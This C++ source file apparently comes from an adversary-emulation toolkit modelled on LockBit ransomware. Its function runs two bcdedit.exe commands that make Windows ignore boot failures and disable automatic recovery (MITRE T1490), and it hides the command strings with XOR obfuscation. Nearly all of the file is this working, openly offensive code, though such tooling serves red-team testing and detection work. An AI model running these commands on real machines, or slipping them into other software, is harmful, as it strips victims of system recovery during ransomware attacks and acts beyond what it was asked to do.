#include "crypto/xor_obfuscation.hpp"
#include "execute.hpp"
#include "tamper.hpp"
#include "logger.hpp"
#include <format>

namespace tamper {

/*
 * DisableBootRecovery:
 *      About:
 *          Uses the bcdedit.exe executable to disable automatic Windows recovery features
 *          by setting the boot loader display to ignore all boot failures and by disabling automatic repair at boot.
 *          The child processes and arguments are as follows:
 *              bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
 *              bcdedit.exe /set {default} recoveryenabled no
 *          Process execution leverages the CreateProcessW API call.
 *      Result:
 *          Two bcdedit.exe processes that set the boot loader display to ignore all boot failures and
 *          disable automatic repair at boot.
 *      MITRE ATT&CK Techniques:
 *          T1490: Inhibit System Recovery
 *      CTI:
 *          https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom
 *          https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockbit-targets-servers
 */
void DisableBootRecovery() {
    DWORD error_code, exit_code;

    // bcdedit /set {default} bootstatuspolicy ignoreallfailures
    wchar_t boot_status_command[128];
    swprintf_s(boot_status_command, 128, L"%s", XOR_WIDE_LIT(L"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"));
    XorLogger::LogInfo(XOR_LIT("Attempting to set boot loader display to ignore all boot failures."));
    XorLogger::LogDebug(XOR_LIT("Executing: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"));
    std::vector<char> output = execute::ExecuteProcess(boot_status_command, 5, &error_code, &exit_code);
    if (error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to execute command. Error code"), error_code));
    } else {
        std::string output_str(output.begin(), output.end());
        XorLogger::LogDebug(std::format("{}: {}", XOR_LIT("bcdedit command output"), output_str));
        if (exit_code != 0) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("bcdedit command failed with exit code"), exit_code));
        } else {
            XorLogger::LogInfo(XOR_LIT("Successfully set boot loader display to ignore all boot failures."));
        }
    }

    // bcdedit /set {default} recoveryenabled no
    wchar_t disable_recovery_command[128];
    swprintf_s(disable_recovery_command, 128, L"%s", XOR_WIDE_LIT(L"bcdedit.exe /set {default} recoveryenabled no"));
    XorLogger::LogInfo(XOR_LIT("Attempting to disable automatic repair at boot."));
    XorLogger::LogDebug(XOR_LIT("Executing: bcdedit.exe /set {default} recoveryenabled no"));
    std::vector<char> recovery_output = execute::ExecuteProcess(disable_recovery_command, 5, &error_code, &exit_code);
    if (error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to execute command. Error code"), error_code));
    } else {
        std::string output_str(recovery_output.begin(), recovery_output.end());
        XorLogger::LogDebug(std::format("{}: {}", XOR_LIT("bcdedit command output"), output_str));
        if (exit_code != 0) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("bcdedit command failed with exit code"), exit_code));
        } else {
            XorLogger::LogInfo(XOR_LIT("Successfully disabled automatic repair at boot."));
        }
    }
}

} // namespace